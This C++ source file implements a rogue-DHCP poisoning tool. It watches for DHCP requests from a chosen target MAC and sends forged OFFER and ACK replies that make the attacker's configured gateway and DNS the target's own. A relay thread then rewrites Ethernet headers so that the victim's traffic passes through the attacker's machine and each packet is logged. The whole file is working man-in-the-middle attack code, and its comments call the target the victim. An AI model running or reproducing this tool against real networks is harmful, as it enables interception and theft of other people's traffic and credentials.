#include "./include/poison.hpp"


Poison::~Poison() { stop(); }
void Poison::stop() {

  if (relayTrafficThread.joinable()) {
    relayTrafficThread.join();
  }
  if (poisoningThread.joinable()) {
    poisoningThread.join();
  }

  close(sockfd);
  close(relayfd);
}

void Poison::start() {

  Logger::SetLogPriority(TracePriority);
  Logger::EnableLogFileOutput();
  Logger::EnableNetworkFileOutput();

  sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
  if (sockfd < 0) {
    LOG_ERROR("Failed to create socket: %s", strerror(errno));
    exit(1);
  }


  relayfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
  if (relayfd < 0) {
    LOG_ERROR("Failed to create forward socket: %s", strerror(errno));
    return;
  }

  int opt = 1;

  setsockopt(sockfd, SOL_SOCKET, SO_BROADCAST, &opt,
             sizeof(opt));
  setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt,
             sizeof(opt));
  setsockopt(sockfd, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt));

  struct ifreq ifr{};
  strncpy(ifr.ifr_name, cfg.interface.c_str(), IFNAMSIZ - 1);
  if (ioctl(sockfd, SIOCGIFINDEX, &ifr) == -1) {
    LOG_ERROR("ioctl(SIOCGIFINDEX): %s", strerror(errno));
    close(sockfd);
    exit(1);
  }
  memset(&serverAddr, 0, sizeof(serverAddr));
  serverAddr.sll_family = AF_PACKET;
  serverAddr.sll_protocol = htons(ETH_P_IP);
  serverAddr.sll_ifindex = ifr.ifr_ifindex;
  if (bind(sockfd, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) < 0) {
    LOG_ERROR("Bind: %s", strerror(errno));
    close(sockfd);
    exit(1);
  }

  memset(&ifr, 0, sizeof(ifr));
  strncpy(ifr.ifr_name, cfg.interface.c_str(), IFNAMSIZ - 1);
  if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) == -1) {
    LOG_ERROR("ioctl(SIOCGIFHWADDR): %s", strerror(errno));
    close(sockfd);
    exit(1);
  }
  memcpy(cfg.interfaceMac, ifr.ifr_hwaddr.sa_data, 6);

  char ifaceMacStr[18];
  snprintf(ifaceMacStr, sizeof(ifaceMacStr), "%02x:%02x:%02x:%02x:%02x:%02x",
           cfg.interfaceMac[0], cfg.interfaceMac[1], cfg.interfaceMac[2],
           cfg.interfaceMac[3], cfg.interfaceMac[4], cfg.interfaceMac[5]);
  LOG_INFO("Interface %s MAC: %s", cfg.interface.c_str(), ifaceMacStr);
  sleep(1);

  relayTrafficThread = thread(&Poison::relayTraffic, this);
  poisoningThread = thread(&Poison::poisoning, this);
}

void Poison::poisoning() {

  uint8_t buffer[MTU];
  while (true) {
    ssize_t dataSize =
        recvfrom(sockfd, buffer, sizeof(buffer), 0, nullptr, nullptr);
    if (dataSize < 0) {
      if (errno == EBADF) {
        LOG_WARN("recvfrom: %s,%d", strerror(errno), sockfd);
        break;
      }
      LOG_WARN("recvfrom: %s", strerror(errno), sockfd);
      continue;
    }
    struct ethhdr *eth = (struct ethhdr *)buffer;
    if (ntohs(eth->h_proto) != ETH_P_IP)
      continue;
    if (memcmp(eth->h_source, cfg.targetMac, 6) != 0)
      continue;
    struct iphdr *ip = (struct iphdr *)(buffer + sizeof(struct ethhdr));
    if (ip->protocol != IPPROTO_UDP)
      continue;
    struct udphdr *udp = (struct udphdr *)((uint8_t *)ip + ip->ihl * 4);
    if (ntohs(udp->dest) != DHCP_SERVER_PORT &&
        ntohs(udp->source) != DHCP_CLIENT_PORT)
      continue;

    // start of the dhcp
    const uint8_t *dhcp =
        reinterpret_cast<const uint8_t *>(udp) + sizeof(struct udphdr);
    // [full UDP len with payload  - udp header ] = body
    size_t dhcpLen = ntohs(udp->len) - sizeof(struct udphdr);
    DHCPPacket packet;
    if (!packet.parse(dhcp, dhcpLen)) {
      LOG_WARN("failed to parse dhcp packet");
      continue;
    }
    handleClientRequest(packet);
  }
}



void Poison::relayTraffic() {

  struct sockaddr_ll sendAddr = {};
  sendAddr.sll_family = AF_PACKET;
  sendAddr.sll_protocol = htons(ETH_P_IP);
  sendAddr.sll_ifindex = if_nametoindex(cfg.interface.c_str());
  if (sendAddr.sll_ifindex == 0) {
    LOG_ERROR("Invalid interface name: %s", cfg.interface.c_str());
    close(relayfd);
    return;
  }
  sendAddr.sll_halen = 6;
  if (bind(relayfd, (struct sockaddr *)&sendAddr, sizeof(sendAddr)) < 0) {
    LOG_ERROR("Bind failed: %s (errno=%d)", strerror(errno), errno);
    close(relayfd);
    return;
  }
  uint8_t buffer[MTU];

  while (true) {
    ssize_t bytesReceived =
        recvfrom(relayfd, buffer, sizeof(buffer), 0, nullptr, nullptr);
    if (bytesReceived < 0) {
      if (errno != EAGAIN && errno != EWOULDBLOCK) {
        LOG_ERROR("recvfrom failed: %s", strerror(errno));
      }
      continue;
    }
    if (bytesReceived > MTU) {
      LOG_WARN("Packet too large for interface MTU (%d bytes): %zd bytes", MTU,
               bytesReceived);
      continue;
    }
    if (bytesReceived <
        (ssize_t)(sizeof(struct ethhdr) + sizeof(struct iphdr))) {
      LOG_WARN("Received packet is too short: %zd bytes", bytesReceived);
      continue;
    }

    struct ethhdr *eth = (struct ethhdr *)buffer;
    if (ntohs(eth->h_proto) != ETH_P_IP)
      continue;

    // IGNORE MY OWN PACKETS
    if (memcmp(eth->h_source, cfg.interfaceMac, 6) == 0)
      continue;

    //  Only process packets that involve the victim
    bool isFromVictim = (memcmp(eth->h_source, cfg.targetMac, 6) == 0);
    bool isToVictim = (memcmp(eth->h_dest, cfg.targetMac, 6) == 0);

    if (!isFromVictim || isToVictim) {
      continue;
    }

    struct iphdr *ip = (struct iphdr *)(buffer + sizeof(struct ethhdr));
    if (ip->ihl < 5) {
      LOG_DEBUG("Invalid IP header length: %u", ip->ihl);
      continue;
    }
    size_t ipHeaderLen = (size_t)ip->ihl * 4;
    if (bytesReceived < (ssize_t)(sizeof(struct ethhdr) + ipHeaderLen)) {
      LOG_WARN("Received packet is too short: %zd bytes", bytesReceived);
      continue;
    }

    if (ip->protocol == IPPROTO_UDP) {
      struct udphdr *udp = (struct udphdr *)((uint8_t *)ip + ipHeaderLen);
      uint16_t dstPort = ntohs(udp->dest);
      uint16_t srcPort = ntohs(udp->source);
      if (dstPort == DHCP_SERVER_PORT || srcPort == DHCP_CLIENT_PORT ||
          dstPort == DHCP_CLIENT_PORT || srcPort == DHCP_SERVER_PORT) {
        continue;
      }
    }

    uint32_t srcIp = ip->saddr;
    uint32_t dstIp = ip->daddr;


    bool isFromClient = (memcmp(eth->h_source, cfg.targetMac, 6) == 0);
    bool isFromRouter = (memcmp(eth->h_source, cfg.routerMac, 6) == 0);

    char srcMacStr[18], dstMacStr[18];
    snprintf(srcMacStr, sizeof(srcMacStr), "%02x:%02x:%02x:%02x:%02x:%02x",
             eth->h_source[0], eth->h_source[1], eth->h_source[2],
             eth->h_source[3], eth->h_source[4], eth->h_source[5]);
    snprintf(dstMacStr, sizeof(dstMacStr), "%02x:%02x:%02x:%02x:%02x:%02x",
             eth->h_dest[0], eth->h_dest[1], eth->h_dest[2], eth->h_dest[3],
             eth->h_dest[4], eth->h_dest[5]);

    char srcIpStr[INET_ADDRSTRLEN], dstIpStr[INET_ADDRSTRLEN];
    struct in_addr srcAddr{srcIp}, dstAddr{dstIp};
    inet_ntop(AF_INET, &srcAddr, srcIpStr, INET_ADDRSTRLEN);
    inet_ntop(AF_INET, &dstAddr, dstIpStr, INET_ADDRSTRLEN);

    LOG_INFO("packet - From: %s->%s | IP: %s->%s | Proto: %d", srcMacStr,
             dstMacStr, srcIpStr, dstIpStr, ntohs(ip->protocol));
    LOG_NETWORK_PACKET(buffer, bytesReceived);

    if (isFromClient) {
      // Client -> Internet: Change dest MAC to router, src MAC to attacker
      memcpy(eth->h_dest, cfg.routerMac, 6);
      memcpy(eth->h_source, cfg.interfaceMac, 6);
      memcpy(sendAddr.sll_addr, cfg.routerMac, 6);
    } else if (isFromRouter) {
      // Internet -> Client: Change dest MAC to victim, src MAC to attacker
      memcpy(eth->h_dest, cfg.targetMac, 6);
      memcpy(eth->h_source, cfg.interfaceMac, 6);
      memcpy(sendAddr.sll_addr, cfg.targetMac, 6);
    } else {
      continue;
    }

    ssize_t sentBytes = sendto(relayfd, buffer, bytesReceived, 0,
                               (struct sockaddr *)&sendAddr, sizeof(sendAddr));
    if (sentBytes < 0) {
      LOG_ERROR("sendto failed: %s (errno=%d)", strerror(errno), errno);
    } else {
      LOG_DEBUG("Relayed %zd bytes", sentBytes);
    }
  }

  LOG_INFO("relayTraffic thread stopping");
  close(relayfd);
}


bool Poison::handleClientRequest(const DHCPPacket &packet) {
  uint8_t msgType = packet.getMessageType();
  uint8_t buffer[MTU];
  ssize_t len =
      sizeof(buffer) - sizeof(ethhdr) - sizeof(iphdr) - sizeof(udphdr);
  size_t dhcpLen = 0;

  switch (msgType) {
  case DHCP_DISCOVER:
    LOG_INFO("DHCP DISCOVER received (XID=0x%08x)", packet.getTransactionID());
    dhcpLen = offer(
        packet, buffer + sizeof(ethhdr) + sizeof(iphdr) + sizeof(udphdr), len);
    if (dhcpLen == 0) {
      return false;
    }
    LOG_INFO("DHCP OFFER built successfully (len=%zu)", dhcpLen);
    break;
  case DHCP_REQUEST:
    LOG_INFO("DHCP REQUEST received (XID=0x%08x)", packet.getTransactionID());
    dhcpLen = acknowledge(
        packet, buffer + sizeof(ethhdr) + sizeof(iphdr) + sizeof(udphdr), len);
    if (dhcpLen == 0) {
      return false;
    }
    LOG_INFO("DHCP ACK built successfully (len=%zu)", dhcpLen);
    break;
  default:
    LOG_WARN("DHCP message type %u (XID=0x%08x)", msgType,
             packet.getTransactionID());
    break;
  };

  // build ethernet
  uint8_t clientMac[6];
  if (packet.getFlags() & DHCP_FLAGS_BROADCAST) {
    memset(clientMac, 0xFF, 6);
  } else {
    packet.getClientHWAddr(clientMac, sizeof(clientMac));
  }
  buildEther(buffer, cfg.interfaceMac, clientMac, ETH_P_IP);

  // build IP

  uint32_t ipDst = (packet.getFlags() & DHCP_FLAGS_BROADCAST)
                       ? htonl(0xFFFFFFFF)
                       : cfg.ipToGive;
  uint16_t ipTotalLen = sizeof(iphdr) + sizeof(udphdr) + dhcpLen;
  buildIp(buffer + sizeof(ethhdr), cfg.gateway, ipDst, ipTotalLen, IPPROTO_UDP);

  // build UDP

  buildUDP(buffer + sizeof(ethhdr) + sizeof(iphdr), cfg.gateway, ipDst,
           DHCP_SERVER_PORT, DHCP_CLIENT_PORT, sizeof(udphdr) + dhcpLen);
  memcpy(serverAddr.sll_addr, clientMac, 6);
  serverAddr.sll_halen = 6;
  ssize_t sentBytes =
      sendto(sockfd, buffer, sizeof(ethhdr) + ipTotalLen, 0,
             (struct sockaddr *)&serverAddr, sizeof(serverAddr));
  if (sentBytes < 0) {
    LOG_WARN("sendto: %s", strerror(errno));
    return false;
  }
  LOG_INFO("Finished handling client request (XID=0x%08x)",
           packet.getTransactionID());
  return true;
}

void Poison::buildEther(uint8_t *buffer, const uint8_t *src, const uint8_t *dst,
                        const uint16_t type) {
  ethhdr *eth = reinterpret_cast<ethhdr *>(buffer);
  memcpy(eth->h_dest, dst, 6);   // Copy 6 bytes for destination MAC
  memcpy(eth->h_source, src, 6); // Copy 6 bytes for source MAC
  eth->h_proto = htons(type); // Set protocol type (e.g., ETH_P_IP for 0x0800)
}

void Poison::buildIp(uint8_t *buffer, uint32_t src, uint32_t dest,
                     uint16_t total, uint8_t protocol) {
  if (total < 20) {
    LOG_ERROR(
        "Total length too small for IP header: got %d bytes, need at least 20",
        total);
  }
  iphdr *ip = reinterpret_cast<iphdr *>(buffer);
  ip->version = 4; // IPv4
  ip->ihl = 5;     // Header length (5 words = 20 bytes, no options)
  ip->tos = 0;     // Type of Service (default)
  ip->tot_len = htons(total);
  ip->id = htons(0); // Identification
  ip->frag_off = 0;  // No fragmentation
  ip->ttl = 64;
  ip->protocol = protocol;
  ip->check = 0;
  ip->saddr = src;
  ip->daddr = dest;
  ip->check = checksumIp(buffer, ip->ihl);
}

void Poison::buildUDP(uint8_t *buffer, uint32_t srcip, uint32_t dstip,
                      uint16_t src, uint16_t dst, uint16_t length) {
  if (!buffer) {
    LOG_ERROR("Null buffer provided");
  }
  if (length < 8) {
    LOG_ERROR("UDP length too small for header");
  }
  udphdr *udp = reinterpret_cast<udphdr *>(buffer);
  udp->source = htons(src);
  udp->dest = htons(dst);
  udp->len = htons(length);
  udp->check = 0;
  udp->check = checksumUDP(srcip, dstip, buffer, length);
}

uint16_t Poison::checksumUDP(uint32_t src_ip, uint32_t dest_ip,
                             uint8_t *udp_data, uint16_t udp_length) {
  uint32_t sum = 0;
  uint16_t *data = (uint16_t *)udp_data;

  // Pseudo-header fields
  sum += (src_ip >> 16) & 0xFFFF;  // Source IP (high 16 bits)
  sum += src_ip & 0xFFFF;          // Source IP (low 16 bits)
  sum += (dest_ip >> 16) & 0xFFFF; // Destination IP (high 16 bits)
  sum += dest_ip & 0xFFFF;         // Destination IP (low 16 bits)
  sum += htons(IPPROTO_UDP);       // Protocol (UDP = 17)
  sum += htons(udp_length);        // UDP length

  // Sum the UDP header and data
  for (int i = 0; i < (udp_length / 2); i++) {
    sum += *data++;
  }
  if (udp_length % 2) {
    // Add padding byte if odd length
    sum += *((uint8_t *)data) << 8;
  }

  // Fold 32-bit sum into 16 bits
  while (sum >> 16) {
    sum = (sum & 0xFFFF) + (sum >> 16);
  }

  // Take one's complement
  uint16_t checksum = ~sum;
  return (checksum == 0) ? 0xFFFF
                         : checksum; // RFC 768: 0 is invalid, use 0xFFFF
}

uint16_t Poison::checksumIp(const uint8_t *buffer, uint8_t ihl) {
  uint32_t sum = 0;
  const uint16_t *data = (const uint16_t *)buffer;

  // Sum the IP header (ihl * 4 bytes)
  for (int i = 0; i < ihl * 2; i++) {
    sum += *data++;
  }

  // Fold 32-bit sum into 16 bits
  while (sum >> 16) {
    sum = (sum & 0xFFFF) + (sum >> 16);
  }

  // Take one's complement
  return (uint16_t)~sum;
}
uint16_t Poison::checksumTCP(uint32_t src_ip, uint32_t dest_ip,
                             uint8_t *tcp_data, uint16_t tcp_length) {
  uint32_t sum = 0;
  uint16_t *data = (uint16_t *)tcp_data;

  sum += (src_ip >> 16) & 0xFFFF;  // Source IP (high 16 bits)
  sum += src_ip & 0xFFFF;          // Source IP (low 16 bits)
  sum += (dest_ip >> 16) & 0xFFFF; // Destination IP (high 16 bits)
  sum += dest_ip & 0xFFFF;         // Destination IP (low 16 bits)
  sum += htons(IPPROTO_TCP);       // Protocol (TCP = 6)
  sum += htons(tcp_length);        // TCP length (header + data)

  // Sum the TCP header and data
  for (int i = 0; i < (tcp_length / 2); i++) {
    sum += *data++;
  }
  if (tcp_length % 2) {
    // Handle odd length by padding with a zero byte
    sum += *((uint8_t *)data) << 8;
  }

  // Fold 32-bit sum into 16 bits
  while (sum >> 16) {
    sum = (sum & 0xFFFF) + (sum >> 16);
  }

  // Take one's complement
  uint16_t checksum = ~sum;
  return (checksum == 0) ? 0xFFFF
                         : checksum; // RFC 793: 0 is invalid, use 0xFFFF
}

size_t Poison::offer(const DHCPPacket &pkt, uint8_t *buffer, size_t len) {

  DHCPPacket offerPkt;
  offerPkt.setOp(BOOTREPLY);
  offerPkt.setHardwareType(1);
  offerPkt.setHardwareLength(6);
  offerPkt.setHops(0);
  offerPkt.setTransactionID(pkt.getTransactionID());
  offerPkt.setSeconds(0);
  offerPkt.setFlags(DHCP_FLAGS_BROADCAST);
  uint8_t mac[6];
  pkt.getClientHWAddr(mac, 6);
  offerPkt.setClientHWAddr(mac, 6);
  offerPkt.setClientIP(0);           // ciaddr = 0
  offerPkt.setYourIP(cfg.ipToGive);  // yiaddr = IP being offered
  offerPkt.setServerIP(cfg.gateway); // siaddr = DHCP server IP
  offerPkt.setGatewayIP(0);          // giaddr = 0 unless relayed

  offerPkt.setDHCPMessage(DHCP_OFFER);
  offerPkt.setServerIdentifier(cfg.gateway);
  offerPkt.setLeaseTime(3600);

  const vector<uint8_t> codes = pkt.getListParams();
  for (auto code : codes) {
    switch (code) {
    case DHCP_OPT_SUBNET_MASK:
      offerPkt.setSubnetMask(cfg.subnet);
      break;
    case DHCP_OPT_BROADCAST_ADDRESS:
      offerPkt.setBroadcastAddress(cfg.broadcast);
      break;
    case DHCP_OPT_TIME_OFFSET:
      offerPkt.setTimeOffset(8 * 3600);
      break;
    case DHCP_OPT_ROUTER:
      offerPkt.setRouter(cfg.gateway);
      break;
    case DHCP_OPT_DNS:
      offerPkt.setDNS(cfg.dns);
      break;
    case DHCP_OPT_HOST_NAME:
      offerPkt.setHostname(cfg.hostName);
      break;
    case DHCP_OPT_DOMAIN_NAME:
      offerPkt.setDomainName(cfg.domainName);
      break;
    }
  }

  size_t dhcpLen = offerPkt.build(buffer, len);
  if (dhcpLen == 0) {
    LOG_ERROR("Failed to build DHCP OFFER for XID=0x%08x",
              pkt.getTransactionID());
    return 0;
  }

  return dhcpLen;
}

size_t Poison::acknowledge(const DHCPPacket &pkt, uint8_t *buffer, size_t len) {
  DHCPPacket ackPkt;
  ackPkt.setOp(BOOTREPLY);
  ackPkt.setHardwareType(1);
  ackPkt.setHardwareLength(6);
  ackPkt.setHops(0);
  ackPkt.setTransactionID(pkt.getTransactionID());
  ackPkt.setSeconds(0);
  ackPkt.setFlags(pkt.getFlags());

  uint8_t mac[6];
  pkt.getClientHWAddr(mac, 6);
  ackPkt.setClientHWAddr(mac, 6);
  ackPkt.setClientIP(0);
  ackPkt.setYourIP(cfg.ipToGive);
  ackPkt.setServerIP(cfg.gateway);
  ackPkt.setGatewayIP(0);
  vector<uint8_t> codes = pkt.getListParams();
  for (auto code : codes) {
    switch (code) {
    case DHCP_OPT_SUBNET_MASK:
      ackPkt.setSubnetMask(cfg.subnet);
      break;
    case DHCP_OPT_BROADCAST_ADDRESS:
      ackPkt.setBroadcastAddress(cfg.broadcast);
      break;
    case DHCP_OPT_TIME_OFFSET:
      ackPkt.setTimeOffset(8 * 3600);
      break;
    case DHCP_OPT_ROUTER:
      ackPkt.setRouter(cfg.gateway);
      break;
    case DHCP_OPT_DNS:
      ackPkt.setDNS(cfg.dns);
      break;
    case DHCP_OPT_HOST_NAME:
      ackPkt.setHostname(cfg.hostName);
      break;
    case DHCP_OPT_DOMAIN_NAME:
      ackPkt.setDomainName(cfg.domainName);
      break;
    }
  }

  ackPkt.setDHCPMessage(DHCP_ACK);
  ackPkt.setLeaseTime(3600);
  ackPkt.setServerIdentifier(cfg.gateway);
  size_t dhcpLen = ackPkt.build(buffer, len);
  if (dhcpLen == 0) {
    LOG_ERROR("Failed to build DHCP ACK for XID=0x%08x",
              pkt.getTransactionID());
    return 0;
  }
  return dhcpLen;
};
